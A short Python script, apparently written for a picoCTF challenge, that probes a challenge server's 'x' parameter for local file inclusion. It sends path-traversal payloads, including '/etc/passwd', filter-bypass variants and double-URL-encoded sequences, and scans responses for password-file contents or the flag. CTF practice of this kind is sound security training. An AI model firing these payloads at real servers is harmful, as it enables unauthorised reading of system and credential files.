import requests
base = 'http://wily-courier.picoctf.net:49463'

# LFI tests in x parameter
payloads = ['../', '..\\', 'flag', 'secret.txt', '/etc/passwd', '../../../etc/passwd', '....//....//....//etc/passwd', '..%252f..%252f..%252fetc/passwd', 'index', 'index.html', '.', '']
for p in payloads:
    r = requests.get(base, params={'x': p})
    print(f'x={p!r}')
    print(f'Length: {len(r.text)}')
    if 'root:' in r.text or 'picoCTF' in r.text or 'flag' in r.text.lower():
        print('FOUND:', r.text[:500])
    if r.text != requests.get(base).text:
        # Different from baseline
        if len(r.text) < 100:
            print('Short response:', r.text)
        elif 'alert' not in r.text:
            print('Different but long')
    print('---')